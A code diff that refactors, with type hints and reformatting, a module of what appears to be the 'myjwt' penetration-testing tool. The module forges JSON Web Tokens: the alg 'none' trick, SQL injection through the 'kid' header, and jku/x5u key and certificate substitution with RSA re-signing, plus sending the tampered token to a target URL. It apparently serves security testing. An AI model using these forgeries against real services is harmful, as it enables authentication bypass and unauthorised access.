@@ -1,26 +1,21 @@
 """
 All methods needed to try vulnerabilities on jwt
 """
+
 import base64
 import json
-from typing import Dict
+from typing import Any, cast
 
 import click
 import requests
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
 from OpenSSL import crypto
 
 from myjwt.Exception import InvalidJWT
-from myjwt.modify_jwt import change_alg
-from myjwt.modify_jwt import signature
-from myjwt.utils import create_crt
-from myjwt.utils import encode_jwt
-from myjwt.utils import HEADER
-from myjwt.utils import is_valid_jwt
-from myjwt.utils import jwt_to_json
-from myjwt.utils import PAYLOAD
-from myjwt.utils import SIGNATURE
+from myjwt.modify_jwt import change_alg, signature
+from myjwt.utils import HEADER, PAYLOAD, SIGNATURE, create_crt, encode_jwt, is_valid_jwt, jwt_to_json
 
 
 def none_vulnerability(jwt: str) -> str:
@@ -145,8 +140,8 @@ def inject_sql_kid(jwt: str, injection: str) -> str:
 def send_jwt_to_url(
     url: str,
     method: str,
-    data: Dict,
-    cookies: Dict,
+    data: dict[str, Any],
+    cookies: dict[str, Any],
     jwt: str,
 ) -> requests.Response:
     """
@@ -179,7 +174,7 @@ def send_jwt_to_url(
     return requests.request(method=method, url=url, json=data, cookies=cookies)
 
 
-def print_decoded(jwt: str):
+def print_decoded(jwt: str) -> None:
     """
     Print your jwt.
 
@@ -200,32 +195,20 @@ def print_decoded(jwt: str):
     click.echo("Header: ")
     for key in jwt_json[HEADER].keys():
         click.echo(
-            str(key)
-            + " = "
-            + (
-                str(jwt_json[HEADER][key])
-                if jwt_json[HEADER][key] is not None
-                else "null"
-            ),
+            str(key) + " = " + (str(jwt_json[HEADER][key]) if jwt_json[HEADER][key] is not None else "null"),
         )
 
     click.echo("")
     click.echo("Payload: ")
     for key in jwt_json[PAYLOAD].keys():
         click.echo(
-            str(key)
-            + " = "
-            + (
-                str(jwt_json[PAYLOAD][key])
-                if jwt_json[PAYLOAD][key] is not None
-                else "null"
-            ),
+            str(key) + " = " + (str(jwt_json[PAYLOAD][key]) if jwt_json[PAYLOAD][key] is not None else "null"),
         )
     click.echo("")
     click.echo("Signature: \n" + json.dumps(jwt_json[SIGNATURE]))
 
 
-def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
+def jku_vulnerability(jwt: str = "", url: str = "", file: str | None = None, pem: str | None = None) -> str:
     """
     Check jku Vulnerability.
 
@@ -268,7 +251,7 @@ def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
         key.generate_key(type=crypto.TYPE_RSA, bits=2048)
     else:
         key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
-    priv = key.to_cryptography_key()
+    priv = cast(RSAPrivateKey, key.to_cryptography_key())
     pub = priv.public_key()
 
     e = pub.public_numbers().e
@@ -304,7 +287,9 @@ def jku_vulnerability(jwt=None, url=None, file=None, pem=None):
     return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
 
 
-def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None, file=None):
+def x5u_vulnerability(
+    jwt: str = "", url: str = "", crt: str | None = None, pem: str | None = None, file: str | None = None
+) -> str:
     """
     Check jku Vulnerability.
 
@@ -343,9 +328,7 @@ def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None, file=None):
 
     x5u = requests.get(jwt_json[HEADER]["x5u"]).json()
     x5u["keys"][0]["x5c"] = (
-        content.replace("-----END CERTIFICATE-----", "")
-        .replace("-----BEGIN CERTIFICATE-----", "")
-        .replace("\n", "")
+        content.replace("-----END CERTIFICATE-----", "").replace("-----BEGIN CERTIFICATE-----", "").replace("\n", "")
     )
     if ".json" not in file:
         file += ".json"
@@ -360,7 +343,7 @@ def x5u_vulnerability(jwt=None, url=None, crt=None, pem=None, file=None):
     s = encode_jwt(jwt_json)
     key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
 
-    priv = key.to_cryptography_key()
+    priv = cast(RSAPrivateKey, key.to_cryptography_key())
     sign = priv.sign(
         bytes(s, encoding="UTF-8"),
         algorithm=hashes.SHA256(),
